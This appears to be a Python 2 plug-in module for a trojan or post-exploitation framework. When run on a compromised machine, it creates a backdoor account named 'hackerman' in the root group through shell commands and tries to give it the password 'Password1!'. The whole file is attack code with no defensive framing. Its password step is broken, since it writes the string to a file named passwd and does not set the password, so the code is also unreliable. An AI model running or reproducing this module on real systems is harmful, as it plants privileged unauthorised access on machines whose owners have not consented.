import os
import subprocess

def run(**args):
    print "[*] In adduser module."

    info = ""
    output = subprocess.check_output("useradd -g 0 -m hackerman", stderr=subprocess.STDOUT, shell=True)
    info += output + "\n"

    output = subprocess.check_output("echo -n 'Password1!' > passwd hackerman", stderr=subprocess.STDOUT, shell=True)
    info += output + "\n"

    info += "user added"
    return info